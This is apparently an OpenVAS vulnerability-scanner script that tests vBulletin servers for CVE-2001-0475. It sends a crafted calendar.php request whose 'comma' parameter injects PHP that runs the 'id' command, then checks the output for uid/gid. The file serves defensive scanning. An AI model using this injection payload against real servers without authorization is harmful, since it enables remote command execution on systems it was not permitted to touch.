CPE = "cpe:/a:vbulletin:vbulletin";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11179" );
	script_version( "2020-08-24T15:47:14+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:47:14 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 2474 );
	script_cve_id( "CVE-2001-0475" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "vBulletin's Calendar Command Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 SecurITeam" );
	script_family( "Web application abuses" );
	script_dependencies( "vbulletin_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "vbulletin/detected" );
	script_xref( name: "URL", value: "http://www.securiteam.com/securitynews/5IP0B203PI.html" );
	script_tag( name: "summary", value: "A vulnerability in vBulletin enables attackers to craft special URLs
  that will execute commands on the server through the vBulletin PHP script." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("list_array_func.inc.sc");
require("port_service_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
http_check_remote_code( unique_dir: dir, check_request: "/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22", check_result: "uid=[0-9]+.*gid=[0-9]+.*", command: "id" );
exit( 99 );

